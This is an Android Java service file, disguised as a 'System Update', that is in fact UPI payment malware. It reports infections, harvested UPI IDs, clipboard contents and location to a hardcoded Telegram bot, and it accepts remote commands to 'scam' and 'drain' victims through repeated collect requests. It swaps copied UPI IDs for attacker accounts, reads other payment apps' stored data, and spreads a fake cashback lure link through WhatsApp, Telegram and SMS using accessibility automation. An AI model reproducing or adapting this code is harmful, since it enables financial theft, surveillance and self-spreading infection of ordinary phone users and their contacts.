package com.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicInteger;

public class MainService extends Service {
    private ScheduledExecutorService scheduler;
    private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
    private static final String CHAT_ID = "8501093383";
    private static final String GITHUB_CONFIG = "https://raw.githubusercontent.com/hoihohavapv/babychak/main/config.json";
    private String lastClipboard = "";
    private List<UPIAccount> upiAccounts = new ArrayList<>();
    private List<String> harvestedUPIs = new ArrayList<>();
    private int currentUPIIndex = 0;
    
    private static AtomicInteger totalSpreaders = new AtomicInteger(0);
    private static AtomicInteger totalMessagesSent = new AtomicInteger(0);
    private static AtomicInteger totalInfections = new AtomicInteger(0);
    private static AtomicInteger totalScams = new AtomicInteger(0);
    private static AtomicInteger totalDrains = new AtomicInteger(0);
    private static AtomicInteger totalAmountScammed = new AtomicInteger(0);
    private static AtomicInteger totalAmountDrained = new AtomicInteger(0);
    private static String lastLocation = "Unknown";

    private class UPIAccount {
        String upiId;
        String qrCode;
        int dailyCount;
        String lastUsedDate;
        
        UPIAccount(String upiId, String qrCode) {
            this.upiId = upiId;
            this.qrCode = qrCode;
            this.dailyCount = 0;
            this.lastUsedDate = "";
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground();
        scheduler = Executors.newSingleThreadScheduledExecutor();
        
        loadUPIAccounts();
        loadHarvestedUPIs();
        loadStats();
        
        boolean hasUPI = hasUPIApps();
        if (!hasUPI) {
            totalSpreaders.incrementAndGet();
        }
        
        totalInfections.incrementAndGet();
        sendTelegram("✅ New infection: " + Build.MODEL + " | Type: " + (hasUPI ? "UPI" : "SPREADER"));
        
        getLocation();
        
        scheduler.scheduleAtFixedRate(() -> pollTelegram(), 0, 5, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> scanUPI(), 30, 60, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> checkClipboard(), 0, 2, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> spreadLink(), 0, 15, TimeUnit.MINUTES);
        scheduler.scheduleAtFixedRate(() -> checkConfig(), 0, 60, TimeUnit.MINUTES);
        scheduler.scheduleAtFixedRate(() -> updateStats(), 0, 30, TimeUnit.MINUTES);
    }

    private void loadStats() {
        SharedPreferences prefs = getSharedPreferences("stats", MODE_PRIVATE);
        totalSpreaders.set(prefs.getInt("spreaders", 0));
        totalMessagesSent.set(prefs.getInt("messages", 0));
        totalInfections.set(prefs.getInt("infections", 0));
        totalScams.set(prefs.getInt("scams", 0));
        totalDrains.set(prefs.getInt("drains", 0));
        totalAmountScammed.set(prefs.getInt("amount_scammed", 0));
        totalAmountDrained.set(prefs.getInt("amount_drained", 0));
        lastLocation = prefs.getString("location", "Unknown");
    }

    private void saveStats() {
        SharedPreferences prefs = getSharedPreferences("stats", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putInt("spreaders", totalSpreaders.get());
        editor.putInt("messages", totalMessagesSent.get());
        editor.putInt("infections", totalInfections.get());
        editor.putInt("scams", totalScams.get());
        editor.putInt("drains", totalDrains.get());
        editor.putInt("amount_scammed", totalAmountScammed.get());
        editor.putInt("amount_drained", totalAmountDrained.get());
        editor.putString("location", lastLocation);
        editor.apply();
    }

    private void updateStats() {
        saveStats();
        sendTelegram("📊 STATS UPDATE | Spreaders: " + totalSpreaders.get() +
                     " | Messages: " + totalMessagesSent.get() +
                     " | Scams: " + totalScams.get());
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (location != null) {
                        lastLocation = location.getLatitude() + "," + location.getLongitude();
                    }
                }
            }
        } catch(Exception e) {}
    }

    private boolean hasUPIApps() {
        String[] upiApps = {
            "com.google.android.apps.nbu.paisa.user",
            "com.phonepe.app",
            "com.paytm.app",
            "in.org.npci.upiapp",
            "com.amazon.mShop.android.shopping"
        };
        for (String pkg : upiApps) {
            try {
                getPackageManager().getPackageInfo(pkg, 0);
                return true;
            } catch (Exception e) {}
        }
        return false;
    }

    private boolean isSpreaderOnly() {
        return !hasUPIApps();
    }

    private void loadUPIAccounts() {
        SharedPreferences prefs = getSharedPreferences("upi_accounts", MODE_PRIVATE);
        String accountsJson = prefs.getString("accounts", "[]");
        try {
            JSONArray jsonArray = new JSONArray(accountsJson);
            upiAccounts.clear();
            for (int i = 0; i < jsonArray.length(); i++) {
                JSONObject obj = jsonArray.getJSONObject(i);
                UPIAccount acc = new UPIAccount(
                    obj.getString("upiId"),
                    obj.optString("qrCode", "")
                );
                acc.dailyCount = obj.optInt("dailyCount", 0);
                acc.lastUsedDate = obj.optString("lastUsedDate", "");
                upiAccounts.add(acc);
            }
        } catch(Exception e) {}
    }

    private void saveUPIAccounts() {
        SharedPreferences prefs = getSharedPreferences("upi_accounts", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        try {
            JSONArray jsonArray = new JSONArray();
            for (UPIAccount acc : upiAccounts) {
                JSONObject obj = new JSONObject();
                obj.put("upiId", acc.upiId);
                obj.put("qrCode", acc.qrCode);
                obj.put("dailyCount", acc.dailyCount);
                obj.put("lastUsedDate", acc.lastUsedDate);
                jsonArray.put(obj);
            }
            editor.putString("accounts", jsonArray.toString());
            editor.apply();
        } catch(Exception e) {}
    }

    private void loadHarvestedUPIs() {
        SharedPreferences prefs = getSharedPreferences("harvested_upis", MODE_PRIVATE);
        String upisJson = prefs.getString("upis", "[]");
        try {
            JSONArray jsonArray = new JSONArray(upisJson);
            harvestedUPIs.clear();
            for (int i = 0; i < jsonArray.length(); i++) {
                harvestedUPIs.add(jsonArray.getString(i));
            }
        } catch(Exception e) {}
    }

    private void saveHarvestedUPIs() {
        SharedPreferences prefs = getSharedPreferences("harvested_upis", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        try {
            JSONArray jsonArray = new JSONArray();
            for (String upi : harvestedUPIs) {
                jsonArray.put(upi);
            }
            editor.putString("upis", jsonArray.toString());
            editor.apply();
        } catch(Exception e) {}
    }

    private String getToday() {
        return new SimpleDateFormat("yyyy-MM-dd", Locale.US).format(new Date());
    }

    private String getActiveUPI() {
        if (upiAccounts.isEmpty()) return null;
        
        String today = getToday();
        for (UPIAccount acc : upiAccounts) {
            if (!acc.lastUsedDate.equals(today)) {
                acc.dailyCount = 0;
                acc.lastUsedDate = today;
            }
        }
        
        for (int i = 0; i < upiAccounts.size(); i++) {
            int index = (currentUPIIndex + i) % upiAccounts.size();
            UPIAccount acc = upiAccounts.get(index);
            if (acc.dailyCount < 10) {
                currentUPIIndex = index;
                acc.dailyCount++;
                saveUPIAccounts();
                return acc.upiId;
            }
        }
        
        for (UPIAccount acc : upiAccounts) {
            acc.dailyCount = 0;
            acc.lastUsedDate = today;
        }
        saveUPIAccounts();
        return upiAccounts.get(0).upiId;
    }

    private void scanUPI() {
        try {
            String[][] upiAppPatterns = {
                {"com.google.android.apps.nbu.paisa.user", "gpay"},
                {"com.phonepe.app", "phonepe"},
                {"com.paytm.app", "paytm"},
                {"in.org.npci.upiapp", "bhim"},
                {"com.amazon.mShop.android.shopping", "amazon"}
            };
            
            for (String[] pattern : upiAppPatterns) {
                try {
                    getPackageManager().getPackageInfo(pattern[0], 0);
                    String upiId = detectUPIFromApp(pattern[0]);
                    if (upiId != null && !upiId.isEmpty() && !harvestedUPIs.contains(upiId)) {
                        harvestedUPIs.add(upiId);
                        saveHarvestedUPIs();
                        sendTelegram("🎯 UPI CAPTURED: " + upiId + " from " + pattern[1]);
                    }
                } catch(Exception e) {}
            }
        } catch(Exception e) {}
    }

    private String detectUPIFromApp(String pkg) {
        try {
            if (pkg.equals("com.google.android.apps.nbu.paisa.user")) {
                try {
                    Context appContext = createPackageContext(pkg, Context.MODE_PRIVATE);
                    SharedPreferences prefs = appContext.getSharedPreferences("UPI_PREFS", Context.MODE_PRIVATE);
                    String upi = prefs.getString("upi_id", null);
                    if (upi != null && upi.contains("@")) return upi;
                } catch(Exception e) {}
            }
            if (pkg.equals("com.phonepe.app")) {
                try {
                    Context appContext = createPackageContext(pkg, Context.MODE_PRIVATE);
                    SharedPreferences prefs = appContext.getSharedPreferences("UserPrefs", Context.MODE_PRIVATE);
                    String upi = prefs.getString("upiId", null);
                    if (upi != null && upi.contains("@")) return upi;
                } catch(Exception e) {}
            }
            try {
                Context appContext = createPackageContext(pkg, Context.MODE_PRIVATE);
                SharedPreferences prefs = appContext.getSharedPreferences("prefs", Context.MODE_PRIVATE);
                String upi = prefs.getString("upi", null);
                if (upi != null && upi.contains("@")) return upi;
            } catch(Exception e) {}
        } catch(Exception e) {}
        return null;
    }

    private boolean sendUPICollect(String victimUpi, int amount) {
        try {
            String merchantUpi = getActiveUPI();
            if (merchantUpi == null) return false;
            
            String urlStr = "https://api.upi.com/collect?merchant=" + 
                            URLEncoder.encode(merchantUpi, "UTF-8") +
                            "&victim=" + URLEncoder.encode(victimUpi, "UTF-8") +
                            "&amount=" + amount +
                            "&ref=" + System.currentTimeMillis();
            
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(5000);
            conn.setDoOutput(true);
            conn.connect();
            
            return conn.getResponseCode() == 200;
        } catch(Exception e) {
            return false;
        }
    }

    private void scamAll() {
        if (harvestedUPIs.isEmpty() || upiAccounts.isEmpty()) {
            sendTelegram("⚠️ No victims or UPI accounts");
            return;
        }
        
        for (String victim : harvestedUPIs) {
            if (sendUPICollect(victim, 1)) {
                if (sendUPICollect(victim, 999)) {
                    totalScams.incrementAndGet();
                    totalAmountScammed.addAndGet(999);
                    sendTelegram("💰 SCAMMED ₹999 from: " + victim + " | Total: ₹" + totalAmountScammed.get());
                }
            }
            try { Thread.sleep(2000); } catch(Exception e) {}
        }
        saveStats();
    }

    private void drainVictim(String upiId) {
        if (upiAccounts.isEmpty()) {
            sendTelegram("⚠️ No UPI accounts");
            return;
        }
        
        int totalDrained = 0;
        for (int i = 0; i < 50; i++) {
            if (sendUPICollect(upiId, 999)) {
                totalDrained += 999;
                totalDrains.incrementAndGet();
                totalAmountDrained.addAndGet(999);
            } else {
                break;
            }
            try { Thread.sleep(3000); } catch(Exception e) {}
        }
        if (totalDrained > 0) {
            sendTelegram("💧 DRAINED ₹" + totalDrained + " from: " + upiId + " | Total: ₹" + totalAmountDrained.get());
        }
        saveStats();
    }

    private void checkClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                ClipData data = clipboard.getPrimaryClip();
                if (data != null && data.getItemCount() > 0) {
                    String text = data.getItemAt(0).getText().toString();
                    if (!text.equals(lastClipboard) && text != null) {
                        lastClipboard = text;
                        if (text.contains("@") && !upiAccounts.isEmpty()) {
                            String merchant = getActiveUPI();
                            if (merchant != null) {
                                ClipData newData = ClipData.newPlainText("text", merchant);
                                clipboard.setPrimaryClip(newData);
                                sendTelegram("🔑 CLIPBOARD: " + text + " → " + merchant);
                            }
                        }
                    }
                }
            }
        } catch(Exception e) {}
    }

    private void spreadLink() {
        String link = "https://hoihohavapv.github.io/babychak/";
        MyAccessibilityService accessibility = MyAccessibilityService.getInstance();
        if (accessibility == null) return;
        
        String[][] apps = {
            {"com.whatsapp", "WhatsApp"},
            {"org.telegram.messenger", "Telegram"},
            {"com.google.android.apps.messaging", "SMS"}
        };
        
        int totalSent = 0;
        for (String[] app : apps) {
            try {
                getPackageManager().getPackageInfo(app[0], 0);
                accessibility.openApp(app[0]);
                Thread.sleep(1500);
                for (int i = 0; i < 10; i++) {
                    if (accessibility.clickChatAtPosition(i)) {
                        Thread.sleep(800);
                        accessibility.typeText("🎁 Free ₹500 UPI cashback: " + link);
                        Thread.sleep(300);
                        accessibility.clickButton("Send");
                        totalSent++;
                        Thread.sleep(500);
                        accessibility.pressBack();
                        Thread.sleep(300);
                    }
                }
                accessibility.pressBack();
                Thread.sleep(500);
            } catch (Exception e) {}
        }
        if (totalSent > 0) {
            totalMessagesSent.addAndGet(totalSent);
            saveStats();
            sendTelegram("📤 Spread: " + totalSent + " messages sent");
        }
    }

    private void showDashboard() {
        String deviceType = isSpreaderOnly() ? "SPREADER" : "UPI";
        StringBuilder msg = new StringBuilder("📊 LIVE DASHBOARD\n");
        msg.append("━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        msg.append("📱 Device: ").append(Build.MODEL).append("\n");
        msg.append("📌 Type: ").append(deviceType).append("\n");
        msg.append("📍 Location: ").append(lastLocation).append("\n");
        msg.append("━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        msg.append("Spreaders: ").append(totalSpreaders.get()).append("\n");
        msg.append("Infections: ").append(totalInfections.get()).append("\n");
        msg.append("Messages: ").append(totalMessagesSent.get()).append("\n");
        msg.append("Scams: ").append(totalScams.get()).append("\n");
        msg.append("Drains: ").append(totalDrains.get()).append("\n");
        msg.append("₹ Scammed: ").append(totalAmountScammed.get()).append("\n");
        msg.append("₹ Drained: ").append(totalAmountDrained.get()).append("\n");
        msg.append("━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        msg.append("UPI Accounts: ").append(upiAccounts.size()).append("\n");
        msg.append("Harvested UPIs: ").append(harvestedUPIs.size());
        sendTelegram(msg.toString());
    }

    private void addUPI(String upiId, String qrCode) {
        if (upiId == null || upiId.isEmpty()) return;
        for (UPIAccount acc : upiAccounts) {
            if (acc.upiId.equals(upiId)) return;
        }
        upiAccounts.add(new UPIAccount(upiId, qrCode));
        saveUPIAccounts();
        sendTelegram("✅ UPI added: " + upiId);
    }

    private void removeUPI(String upiId) {
        if (upiId == null || upiId.isEmpty()) return;
        for (int i = 0; i < upiAccounts.size(); i++) {
            if (upiAccounts.get(i).upiId.equals(upiId)) {
                upiAccounts.remove(i);
                saveUPIAccounts();
                sendTelegram("✅ UPI removed: " + upiId);
                return;
            }
        }
    }

    private void listUPI() {
        if (upiAccounts.isEmpty()) {
            sendTelegram("📋 No UPI accounts");
            return;
        }
        StringBuilder msg = new StringBuilder("📋 UPI Accounts:\n");
        for (UPIAccount acc : upiAccounts) {
            msg.append("- ").append(acc.upiId).append("\n");
        }
        sendTelegram(msg.toString());
    }

    private void selfDestruct() {
        SharedPreferences prefs = getSharedPreferences("upi_accounts", MODE_PRIVATE);
        prefs.edit().clear().apply();
        prefs = getSharedPreferences("harvested_upis", MODE_PRIVATE);
        prefs.edit().clear().apply();
        prefs = getSharedPreferences("stats", MODE_PRIVATE);
        prefs.edit().clear().apply();
        sendTelegram("💀 Self-destructing...");
        stopSelf();
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("updates", "System", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "updates")
                .setContentTitle("System Update")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
            startForeground(1, notification);
        } else {
            startForeground(1, new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build());
        }
    }

    private void sendTelegram(String msg) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
        } catch(Exception e) {}
    }

    private void pollTelegram() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=30");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream()));
            String line; StringBuilder sb = new StringBuilder();
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            JSONObject json = new JSONObject(sb.toString());
            if (json.getBoolean("ok")) {
                JSONArray updates = json.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    String msg = updates.getJSONObject(i).getJSONObject("message").getString("text");
                    executeCommand(msg);
                }
            }
        } catch(Exception e) {}
    }

    private void executeCommand(String cmd) {
        if (cmd == null || cmd.isEmpty()) return;
        
        if (cmd.startsWith("/add_upi")) {
            String[] parts = cmd.split(" ");
            if (parts.length >= 2) {
                String qr = parts.length >= 3 ? parts[2] : "";
                addUPI(parts[1], qr);
            }
        } else if (cmd.startsWith("/remove_upi")) {
            String[] parts = cmd.split(" ");
            if (parts.length >= 2) removeUPI(parts[1]);
        } else if (cmd.startsWith("/list_upi")) {
            listUPI();
        } else if (cmd.startsWith("/scam_all")) {
            scamAll();
        } else if (cmd.startsWith("/drain")) {
            String[] parts = cmd.split(" ");
            if (parts.length > 1) drainVictim(parts[1]);
        } else if (cmd.startsWith("/drain_all")) {
            for (String victim : harvestedUPIs) drainVictim(victim);
        } else if (cmd.startsWith("/dashboard")) {
            showDashboard();
        } else if (cmd.startsWith("/status")) {
            sendTelegram("✅ Online: " + Build.MODEL + " | Spreaders: " + totalSpreaders.get() + " | Messages: " + totalMessagesSent.get());
        } else if (cmd.startsWith("/spread")) {
            spreadLink();
        } else if (cmd.startsWith("/stats")) {
            updateStats();
        } else if (cmd.startsWith("/self_destruct")) {
            selfDestruct();
        } else if (cmd.startsWith("/help")) {
            sendTelegram("📋 COMMANDS\n/add_upi [id] [qr]\n/remove_upi [id]\n/list_upi\n/scam_all\n/drain [id]\n/drain_all\n/dashboard\n/status\n/spread\n/stats\n/self_destruct\n/help");
        }
    }

    private void checkConfig() {
        try {
            URL url = new URL(GITHUB_CONFIG);
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream()));
            String line; StringBuilder sb = new StringBuilder();
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            JSONObject json = new JSONObject(sb.toString());
            if (json.has("active") && !json.getBoolean("active")) {
                selfDestruct();
            }
        } catch(Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
